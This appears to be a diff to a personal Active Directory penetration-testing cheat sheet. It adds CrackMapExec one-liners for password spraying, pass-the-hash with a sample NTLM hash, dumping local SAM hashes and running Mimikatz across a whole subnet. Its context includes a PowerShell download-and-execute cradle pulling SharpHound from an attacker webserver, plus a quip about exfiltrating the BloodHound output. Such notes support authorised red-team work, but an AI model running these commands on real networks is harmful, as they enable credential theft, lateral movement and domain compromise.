@@ -317,13 +317,53 @@ python privexchange.py -ah FDQN.m0chanAD.local DOMAINCONTROLLER.m0chanAD.local -
 
 
 
-
-
 Password Spraying
 
 
 
 CrackMapExec
+
+```
+CrackMapExec is installed on Kali or get Windows Binary from Github.
+
+Has 3 Execution Methods
+crackmapexec smb <- Creating and Running a Service over SMB
+crackmapexec wmi <- Executes command over WMI
+crackmapexec at <- Schedules Task with Task Scheduler
+
+Can execute plain commands with -X flag i/e 
+
+crcakmapexec smb 10.10.14.0/24 -x whoami
+
+crcakmapexec smb 10.10.14.0/24 <- Host Discovery
+crackmapexec smb 10.10.14.0/24 -u user -p 'Password' 
+crackmapexec smb 10.10.14.0/24 -u user -p 'Password' --pass-pol
+crackmapexec smb 10.10.14.0/24 -u user -p 'Password' --shares
+
+
+Can also PTH with CME
+
+crackmapexec smb 10.10.14.0/24 -u user -H e8bcd502fbbdcd9379305dca15f4854e
+
+cme smb 10.8.14.14 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:e8bcd502fbbdcd9379305dca15f4854e --local-auth --shares 
+
+
+--local-auth is for Authenticating with Local Admin, good if Organisaton uses same local admin hash through network and not using LAPS
+
+Dump Local SAM hashes
+
+crackmapexec smb 10.10.14.0/24 -u user -p 'Password' --local-auth --sam
+
+Running Mimikatz 
+
+crackmapexec smb 10.10.14.0/24 -u user -p 'Password' --local-auth -M mimikatz
+
+^ Very noisy but yes you can run mimikatz across a WHOLE network range. RIP Domain Admin
+
+Enum AV Products
+
+crackmapexec smb 10.10.14.0/24 -u user -p 'Password' --local-auth -M enum_avproducts
+```
 
 
 
@@ -374,6 +414,12 @@ SharpHound.ps1
 SharpHound.exe -> https://github.com/BloodHoundAD/SharpHound
 
 IEX(System.Net.WebClient.DownloadString('http://webserver:4444/SharpHound.ps1'))
+
+Invoke-CollectionMethod All
+
+Import .zip to Bloodhound
+
+If you can't exfil the .zip... Find a way ;) I joke, I joke. Output as plain json and copy over manually. It's a big big pain but it works.
 ```
 
 
@@ -641,6 +687,12 @@ https://github.com/rasta-mouse/Watson
 
 
 
+Decrypt EFS Files with Mimikatz if Admin/System
+
+```
+
+```
+
 
 
 
@@ -658,6 +710,12 @@ ssh -l root -pw password -R 445:127.0.0.1:445 YOURIPADDRESS
 ```
 
 
+
+CrackMapExec
+
+```
+#https://www.ivoidwarranties.tech/posts/pentesting-tuts/cme/crackmapexec-lateral-movement/
+```
 
 
 
